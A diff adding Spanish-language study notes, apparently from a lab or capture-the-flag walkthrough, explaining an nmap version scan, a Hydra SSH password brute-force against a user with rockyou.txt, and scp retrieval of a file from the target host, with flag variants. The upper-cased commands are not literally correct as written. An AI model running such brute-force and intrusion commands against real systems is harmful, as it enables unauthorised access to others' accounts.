@@ -36,6 +36,45 @@ o	-r 192.168.1.0/24: Rango de red diferente.
 
 o	-P: Muestra en modo pasivo.
 
+2.3.COMANDO: NMAP -SV -N -V 172.17.0.2
+
+•	Descripción: Escaneo con detección de versiones (-sV), sin resolución DNS (-n) y modo detallado (-v).
+
+•	Variantes:
+A: Detección agresiva (SO, scripts).
+
+o	-p: Especifica puertos.
+
+o	-sS: Escaneo SYN stealth.
+
+2.4.COMANDO: HYDRA -L CARLOTA -P /USR/SHARE/WORDLISTS/ROCKYOU.TXT SSH://172.17.0.2 -T 10
+
+•	Descripción: Ataque de fuerza bruta SSH con usuario carlota, usando la lista rockyou.txt, 10 tareas paralelas.
+
+•	Variantes:
+
+	-L: Lista de usuarios.
+
+o	-s: Puerto personalizado.
+
+o	-f: Detener al encontrar contraseña válida.
+
+2.5.5.	COMANDO: SCP carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg .
+
+•	Descripción: Copia el archivo imagen.jpg del servidor remoto a la máquina local.
+
+•	Variantes:
+
+o	scp archivo usuario@ip:/destino: Copia local → remoto.
+
+o	-P: Especificar puerto SSH.
+
+o	-r: Copia recursiva de directorios.
+
+
+
+
+
 
 
 
